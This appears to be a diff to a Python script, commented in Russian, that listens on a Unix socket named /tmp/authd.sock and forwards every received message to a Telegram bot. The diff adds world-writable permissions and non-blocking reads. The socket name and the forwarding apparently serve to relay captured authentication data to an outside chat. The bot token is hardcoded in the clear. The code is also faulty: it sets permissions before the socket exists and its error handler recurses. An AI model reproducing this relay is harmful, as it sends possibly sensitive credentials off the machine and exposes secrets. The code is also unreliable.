@@ -1,5 +1,8 @@
 import socket
 import requests
+import os
+import fcntl
+import errno
 
 # Установите ваш токен бота и chat_id
 bot_token = '7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc'  # Замените на ваш токен
@@ -21,11 +24,31 @@ def send_to_telegram(message):
         print(f"Error sending to Telegram: {e}")
         send_to_telegram(f"Error sending to Telegram: {e}")
 
+def create_socket():
+    """Создание сокета с необходимыми правами."""
+    socket_path = "/tmp/authd.sock"
+    
+    # Удаляем старый сокет, если существует
+    if os.path.exists(socket_path):
+        print(f"Socket {socket_path} exists, removing...")
+        os.remove(socket_path)
+
+    # Создаем новый сокет
+    sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
+    
+    # Устанавливаем права доступа для сокета (например, 0o777)
+    os.chmod(socket_path, 0o777)  # Устанавливаем права доступа (если требуется)
+
+    # Устанавливаем сокет в неблокирующий режим
+    sock.setblocking(False)
+    
+    sock.bind(socket_path)
+    return sock
+
 def listen_on_socket():
     """Прослушивание сокета и отправка данных в Telegram."""
     # Создаем сокет
-    sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
-    sock.bind("/tmp/authd.sock")
+    sock = create_socket()
     
     # Сообщаем в консоль, что скрипт работает
     print("Script is running and listening on socket...")
@@ -35,10 +58,15 @@ def listen_on_socket():
 
     while True:
         try:
-            data, addr = sock.recvfrom(1024)  # Чтение данных
-            if data:
-                message = f"Received data: {data.decode('utf-8')}"
-                send_to_telegram(message)  # Отправляем в Telegram
+            # Неблокирующий прием данных
+            try:
+                data, addr = sock.recvfrom(1024)  # Чтение данных
+                if data:
+                    message = f"Received data: {data.decode('utf-8')}"
+                    send_to_telegram(message)  # Отправляем в Telegram
+            except BlockingIOError:
+                pass  # Просто пропускаем блокировку, если нет данных
+
         except Exception as e:
             print(f"Error: {e}")
             send_to_telegram(f"Error: {e}")
